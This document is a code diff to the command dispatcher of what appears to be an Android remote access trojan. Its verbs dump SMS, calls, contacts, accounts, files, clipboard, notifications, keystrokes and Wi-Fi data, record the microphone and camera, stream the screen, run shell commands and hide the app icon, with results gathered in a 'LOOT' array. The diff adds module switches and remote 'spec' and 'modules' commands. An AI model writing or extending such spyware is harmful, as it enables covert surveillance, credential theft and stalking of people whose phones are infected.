@@ -11,6 +11,8 @@ import android.widget.Toast;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
+import java.util.List;
+
 /**
  * Command table. One method per verb, every return normalised to
  * {@code {"code":0|1,"out":...}}. Handlers run on the pool and may block; the
@@ -20,10 +22,14 @@ final class Dispatcher {
     private static final JSONArray LOOT = new JSONArray();
 
     static void prime(Context ctx) {
-        SmsStore.watch(ctx);
-        CallStore.watch(ctx);
-        if (Common.granted(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION)
-                || Common.granted(ctx, android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
+        if (Modules.on(ctx, "sms")) {
+            SmsStore.watch(ctx);
+        }
+        if (Modules.on(ctx, "calls")) {
+            CallStore.watch(ctx);
+        }
+        if (Modules.on(ctx, "loc") && (Common.granted(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION)
+                || Common.granted(ctx, android.Manifest.permission.ACCESS_COARSE_LOCATION))) {
             LocMon.start(ctx, false);
         }
     }
@@ -44,6 +50,9 @@ final class Dispatcher {
         JSONArray args = task.optJSONArray("args");
         String first = args != null && args.length() > 0 ? args.optString(0) : "";
         String second = args != null && args.length() > 1 ? args.optString(1) : "";
+        if (!Modules.on(ctx, moduleFor(cmd)) && !CORE.contains(cmd)) {
+            return fail(cmd + " disabled by spec");
+        }
         try {
             switch (cmd) {
                 case "ping":
@@ -114,6 +123,10 @@ final class Dispatcher {
                     return ok(ScreenStream.start(ctx));
                 case "screen_stop":
                     return ok(ScreenStream.stop());
+                case "spec":
+                    return ok(Modules.spec(ctx));
+                case "modules":
+                    return ok(Config.get(ctx).modules);
                 case "native_state":
                     return ok(NativeBridge.state());
                 case "native_probe":
@@ -135,6 +148,32 @@ final class Dispatcher {
         } catch (Throwable exc) {
             Log.e("dispatch " + cmd + ": " + exc);
             return fail(cmd + " failed: " + exc);
+        }
+    }
+
+    private static final List<String> CORE = java.util.Arrays.asList(
+            "ping", "info", "perm_status", "spec", "modules", "hide_icon", "toast", "vibrate", "open_url");
+
+    private static String moduleFor(String cmd) {
+        switch (cmd) {
+            case "sms_dump": case "sms_send": return "sms";
+            case "calls_dump": return "calls";
+            case "contacts_dump": case "accounts": return "contacts";
+            case "loc": case "loc_track": return "loc";
+            case "files_ls": case "files_pull": case "files_push": return "files";
+            case "clipboard_get": case "clipboard_set": return "clip";
+            case "notif_dump": return "notif";
+            case "mic_rec": return "mic";
+            case "cam_shot": return "cam";
+            case "screenshot": case "screen_start": case "screen_stop": return "screen";
+            case "shell": return "shell";
+            case "keylog_dump": case "keylog_clear": return "keylog";
+            case "wifi_dump": return "wifi";
+            case "usage": return "usage";
+            case "apps": return "apps";
+            case "native_state": case "native_probe": case "watch_start":
+            case "watch_add": case "watch_drain": return "native";
+            default: return "other";
         }
     }
 
